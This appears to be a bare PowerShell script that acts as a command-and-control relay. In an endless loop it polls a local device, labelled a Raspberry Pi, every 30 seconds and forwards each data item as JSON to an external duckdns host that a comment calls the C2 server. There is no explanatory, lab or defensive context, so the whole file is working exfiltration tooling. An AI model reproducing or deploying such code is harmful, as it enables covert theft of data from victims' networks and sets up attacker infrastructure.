$raspberryPiUrl = "http://10.0.0.1:5000/retrieve_data"
$c2ServerUrl = "https://rapid.tlnas.duckdns.org/receive_ml_data.php"

while ($true) {
    $response = Invoke-RestMethod -Uri $raspberryPiUrl -Method GET
    if ($response.status -eq "success") {
        foreach ($data in $response.data) {
            # Process and forward the data to the C2 server
            $sendResponse = Invoke-RestMethod -Uri $c2ServerUrl -Method POST -Body ($data | ConvertTo-Json) -ContentType "application/json"
        }
    }
    Start-Sleep -Seconds 30
}
